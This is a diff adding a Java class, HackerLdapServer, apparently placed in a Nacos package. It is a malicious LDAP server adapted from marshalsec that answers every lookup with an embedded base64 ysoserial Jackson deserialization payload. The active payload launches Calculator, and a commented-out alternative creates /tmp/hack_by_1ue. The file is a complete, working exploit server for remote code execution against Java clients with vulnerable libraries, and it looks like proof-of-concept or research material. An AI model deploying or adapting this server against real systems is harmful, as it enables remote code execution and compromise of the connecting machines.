@@ -1,0 +1,73 @@
+package com.alibaba.nacos.consistency; /**
+ * In this case
+ * Server return Serialize Payload, such as CommonsCollections
+ * if Client's ClassPath exists lib which is vulnerability version So We can use it
+ * Code part from marshalsec
+ */
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.text.ParseException;
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPException;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+import com.unboundid.util.Base64;
+
+public class HackerLdapServer {
+    private static final String LDAP_BASE = "dc=example,dc=com";
+
+    public static void main ( String[] args ) {
+        int port = 1389;
+        try {
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                    "listen", //$NON-NLS-1$
+                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+            config.addInMemoryOperationInterceptor(new OperationInterceptor());
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
+            ds.startListening();
+        }
+        catch ( Exception e ) {
+            e.printStackTrace();
+        }
+    }
+
+    // in this class remove the construct
+    private static class OperationInterceptor extends InMemoryOperationInterceptor {
+        @Override
+        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
+            String base = "Exploit";
+            Entry e = new Entry(base);
+            try {
+                sendResult(result, base, e);
+                System.out.println("发送了Exploit！！！");
+            }
+            catch ( Exception e1 ) {
+                e1.printStackTrace();
+            }
+        }
+
+        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException, ParseException {
+            e.addAttribute("javaClassName", "foo");
+            // java -jar ysoserial-master-d367e379d9-1.jar Jackson 'open /System/Applications/Calculator.app'|base64
+            e.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAE+cr+ur4AAAAzAEoKABEAIwcAJAgAJQoAJgAnCgACACgIACkKAAIAKggAEggAKwgALAgALQkAEAAuCgAvADAKAC8AMQcAMgcAQQcANAEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAuTHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvQ29tbWFuZFRlbXBsYXRlOwEACDxjbGluaXQ+AQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwAdBwAyAQAKU291cmNlRmlsZQEAFENvbW1hbmRUZW1wbGF0ZS5qYXZhDAAUABUBABBqYXZhL2xhbmcvU3RyaW5nAQAHb3MubmFtZQcANQwANgA3DAA4ADkBAAN3aW4MADoAOwEAAi9jAQAEYmFzaAEAAi1jDAASABMHADwMAD0APgwAPwBAAQATamF2YS9pby9JT0V4Y2VwdGlvbgEALHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvQ29tbWFuZFRlbXBsYXRlAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBADt5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTEyNzgyOTMyMzIzMzI5MQEAPUx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTEyNzgyOTMyMzIzMzI5MTsHAEEJAEMALgEAEm9wZW4gLWEgQ2FsY3VsYXRvcggARQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAEcKAEgAIwAhABAASAAAAAEACAASABMAAAACAAEAFAAVAAEAFgAAAC8AAQABAAAABSq3AEmxAAAAAgAXAAAABgABAAAABQAYAAAADAABAAAABQAZAEIAAAAIABsAFQABABYAAACyAAMAAgAAAEQSRrMARAa9AAJLEgO4AAS2AAUSBrYAB5kAECoDEghTKgQSCVOnAA0qAxIKUyoEEgtTKgWyAAxTuAANKrYADlenAARMsQABAAoAPwBCAA8AAwAXAAAALgALAAUACgAKAA0AGgAOAB8ADwAnABEALAASADEAFAA3ABYAPwAZAEIAFwBDABoAGAAAAAwAAQAKADkAHAAdAAAAHgAAAA4ABPwAJwcAHwlQBwAgAAABACEAAAACACJ1cQB+AAoAAAHUyv66vgAAADMAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAxwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQACE1GQUpMVFNCcHcBAHhzcgAuamF2YXgubWFuYWdlbWVudC5CYWRBdHRyaWJ1dGVWYWx1ZUV4cEV4Y2VwdGlvbtTn2qtjLUZAAgABTAADdmFsdAASTGphdmEvbGFuZy9PYmplY3Q7eHIAE2phdmEubGFuZy5FeGNlcHRpb27Q/R8+GjscxAIAAHhyABNqYXZhLmxhbmcuVGhyb3dhYmxl1cY1Jzl3uMsDAARMAAVjYXVzZXQAFUxqYXZhL2xhbmcvVGhyb3dhYmxlO0wADWRldGFpbE1lc3NhZ2VxAH4ABVsACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAVcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAnNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAJHQAGnlzb3NlcmlhbC5wYXlsb2Fkcy5KYWNrc29udAAMSmFja3Nvbi5qYXZhdAAJZ2V0T2JqZWN0c3EAfgAYAAAAInQAGXlzb3NlcmlhbC5HZW5lcmF0ZVBheWxvYWR0ABRHZW5lcmF0ZVBheWxvYWQuamF2YXQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AFHhyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAmeHNyACxjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5QT0pPTm9kZQAAAAAAAAACAgABTAAGX3ZhbHVlcQB+AA94cgAtY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuVmFsdWVOb2RlAAAAAAAAAAECAAB4cgAwY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuQmFzZUpzb25Ob2RlAAAAAAAAAAECAAB4cHEAfgAHeA=="));
+            // java -jar ysoserial-master-d367e379d9-1.jar Jackson 'touch /tmp/hack_by_1ue'|base64
+            // e.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAE/cr+ur4AAAAzAEoKABEAIwcAJAgAJQoAJgAnCgACACgIACkKAAIAKggAEggAKwgALAgALQkAEAAuCgAvADAKAC8AMQcAMgcAQQcANAEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAuTHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvQ29tbWFuZFRlbXBsYXRlOwEACDxjbGluaXQ+AQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwAdBwAyAQAKU291cmNlRmlsZQEAFENvbW1hbmRUZW1wbGF0ZS5qYXZhDAAUABUBABBqYXZhL2xhbmcvU3RyaW5nAQAHb3MubmFtZQcANQwANgA3DAA4ADkBAAN3aW4MADoAOwEAAi9jAQAEYmFzaAEAAi1jDAASABMHADwMAD0APgwAPwBAAQATamF2YS9pby9JT0V4Y2VwdGlvbgEALHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvQ29tbWFuZFRlbXBsYXRlAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBADt5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTE4NjY1MDU5MTYzMTgzNAEAPUx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTE4NjY1MDU5MTYzMTgzNDsHAEEJAEMALgEAFnRvdWNoIC90bXAvaGFja19ieV8xdWUIAEUBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwBHCgBIACMAIQAQAEgAAAABAAgAEgATAAAAAgABABQAFQABABYAAAAvAAEAAQAAAAUqtwBJsQAAAAIAFwAAAAYAAQAAAAUAGAAAAAwAAQAAAAUAGQBCAAAACAAbABUAAQAWAAAAsgADAAIAAABEEkazAEQGvQACSxIDuAAEtgAFEga2AAeZABAqAxIIUyoEEglTpwANKgMSClMqBBILUyoFsgAMU7gADSq2AA5XpwAETLEAAQAKAD8AQgAPAAMAFwAAAC4ACwAFAAoACgANABoADgAfAA8AJwARACwAEgAxABQANwAWAD8AGQBCABcAQwAaABgAAAAMAAEACgA5ABwAHQAAAB4AAAAOAAT8ACcHAB8JUAcAIAAAAQAhAAAAAgAidXEAfgAKAAAB1Mr+ur4AAAAzABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAMcADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AAhWUkxDSkNTRnB3AQB4c3IALmphdmF4Lm1hbmFnZW1lbnQuQmFkQXR0cmlidXRlVmFsdWVFeHBFeGNlcHRpb27U59qrYy1GQAIAAUwAA3ZhbHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hyABNqYXZhLmxhbmcuRXhjZXB0aW9u0P0fPho7HMQCAAB4cgATamF2YS5sYW5nLlRocm93YWJsZdXGNSc5d7jLAwAETAAFY2F1c2V0ABVMamF2YS9sYW5nL1Rocm93YWJsZTtMAA1kZXRhaWxNZXNzYWdlcQB+AAVbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7TAAUc3VwcHJlc3NlZEV4Y2VwdGlvbnN0ABBMamF2YS91dGlsL0xpc3Q7eHBxAH4AFXB1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAAAJzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4ABUwACGZpbGVOYW1lcQB+AAVMAAptZXRob2ROYW1lcQB+AAV4cAAAACR0ABp5c29zZXJpYWwucGF5bG9hZHMuSmFja3NvbnQADEphY2tzb24uamF2YXQACWdldE9iamVjdHNxAH4AGAAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+ABR4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AJnhzcgAsY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuUE9KT05vZGUAAAAAAAAAAgIAAUwABl92YWx1ZXEAfgAPeHIALWNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlZhbHVlTm9kZQAAAAAAAAABAgAAeHIAMGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLkJhc2VKc29uTm9kZQAAAAAAAAABAgAAeHBxAH4AB3g="));
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        }
+    }
+}
